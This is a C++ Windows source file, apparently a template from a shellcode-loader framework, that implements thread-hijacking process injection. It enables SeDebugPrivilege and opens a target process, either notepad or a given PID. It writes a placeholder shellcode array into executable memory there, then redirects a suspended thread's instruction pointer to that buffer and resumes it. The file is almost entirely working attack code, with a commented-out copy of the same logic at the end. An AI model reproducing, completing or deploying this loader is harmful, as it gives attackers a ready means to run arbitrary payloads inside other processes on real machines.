#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include "winternl.h"
#pragma comment(lib, "ntdll")
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// syscall stub preparation:
typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
    HANDLE token;
    TOKEN_PRIVILEGES priv;
    BOOL ret = FALSE;
    wprintf(L" [+] Enable %ls adequate privilege\n", Privilege);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // if (LookupPrivilegeValue(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
        if (LookupPrivilegeValueW(NULL, Privilege, &priv.Privileges[0].Luid) != FALSE &&
            AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE) {
            ret = TRUE;
        }

        if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { // In case privilege is not part of token (e.g. run as non-admin)
            ret = FALSE;
        }

        CloseHandle(token);
    }

    if (ret == TRUE)
        wprintf(L" [+] Success\n");
    else
        wprintf(L" [-] Failure\n");

    return ret;
}

unsigned char magiccode[] = ####SHELLCODE####;


int main(int argc, char *argv[])
{
    

    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        printf("[-] Failed to load kernel32.dll.\n");
        return -1;
    }

    PFN_GETLASTERROR pGetLastError = (PFN_GETLASTERROR)GetProcAddress(hKernel32, "GetLastError");

    if (!EnableWindowsPrivilege(L"SeDebugPrivilege")) {
    // if (!EnableWindowsPrivilege(TEXT("SeDebugPrivilege"))) {
        printf("[-]Failed to enable SeDebugPrivilege. You might not have sufficient permissions.\n");
        return -1;
    }

    // Target process information:
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0], "running with default notepad");

        if (IsSystem64Bit()) {
            printf("[*] system is 64 bit\n");
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
        } else {
            printf("[*] system is 32 bit\n");
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }

        printf("[*] notepad path: %s\n", notepadPath);
        // Start Notepad
        // BOOL success = CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "[-]Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            DWORD error = GetLastError();
            // You can now print out the error or look it up
            printf("[-]Failed to launch Notepad. Error: %d\n", error);
            return 1;
        }
        // Assign PID
        pid = pi.dwProcessId;
        
    } else {
        printf("[*]PID provided: %s\n", argv[1]);
        // Convert command line argument to PID
        pid = atoi(argv[1]);
    }

    // Wait for 1 second
    Sleep(1000);
    printf("[*] target process PID: %d\n", pid);


DWORD processID = pid;

HANDLE processHandle;
PVOID injectionArea;
HANDLE selectedThread = NULL;
HANDLE processSnapshot;
THREADENTRY32 te32;
CONTEXT ctx;

ctx.ContextFlags = CONTEXT_FULL;
te32.dwSize = sizeof(THREADENTRY32);

processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
if (processHandle != NULL) {
    printf("[+] Opened process %d.\n", processID);
    injectionArea = VirtualAllocEx(processHandle, NULL, sizeof magiccode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (injectionArea != NULL) {
        printf("[+] Allocated memory in target process.\n");
        if (WriteProcessMemory(processHandle, injectionArea, magiccode, sizeof magiccode, NULL)) {
            printf("[+] Wrote magiccode to target process memory.\n");
        } else {
            printf("[-] Failed to write magiccode to target process memory.\n");
        }
    } else {
        printf("[-] Failed to allocate memory in target process.\n");
    }
} else {
    printf("[-] Failed to open target process %d.\n", processID);
}

processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
if (processSnapshot != INVALID_HANDLE_VALUE) {
    printf("[+] Created snapshot of all threads in the system.\n");
    if (Thread32First(processSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processID) {
                selectedThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
                if (selectedThread != NULL) {
                    printf("[+] Opened thread %d of target process.\n", te32.th32ThreadID);
                    break;
                } else {
                    printf("[-] Failed to open thread %d of target process.\n", te32.th32ThreadID);
                }
            }
        } while (Thread32Next(processSnapshot, &te32));
    } else {
        printf("[-] Failed to retrieve threads from snapshot.\n");
    }
} else {
    printf("[-] Failed to create snapshot of all threads in the system.\n");
}

if (selectedThread != NULL) {
    if (SuspendThread(selectedThread) != (DWORD)-1) {
        printf("[+] Suspended selected thread.\n");
        if (GetThreadContext(selectedThread, &ctx)) {
            ctx.Rip = (DWORD_PTR)injectionArea;
            if (SetThreadContext(selectedThread, &ctx)) {
                printf("[+] Set new thread context.\n");
                if (ResumeThread(selectedThread) != (DWORD)-1) {
                    printf("[+] Resumed selected thread.\n");
                } else {
                    printf("[-] Failed to resume selected thread.\n");
                }
            } else {
                printf("[-] Failed to set new thread context.\n");
            }
        } else {
            printf("[-] Failed to get thread context.\n");
        }
    } else {
        printf("[-] Failed to suspend selected thread.\n");
    }
}

// ctx.ContextFlags = CONTEXT_FULL;
// te32.dwSize = sizeof(THREADENTRY32);

// processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
// injectionArea = VirtualAllocEx(processHandle, NULL, sizeof magiccode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
// WriteProcessMemory(processHandle, injectionArea, magiccode, sizeof magiccode, NULL);

// processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
// Thread32First(processSnapshot, &te32);

// while (Thread32Next(processSnapshot, &te32))
// {
// 	if (te32.th32OwnerProcessID == processID)
// 	{
// 		selectedThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
// 		break;
// 	}
// }

// SuspendThread(selectedThread);

// GetThreadContext(selectedThread, &ctx);
// ctx.Rip = (DWORD_PTR)injectionArea;
// SetThreadContext(selectedThread, &ctx);

// ResumeThread(selectedThread);

return 0;
}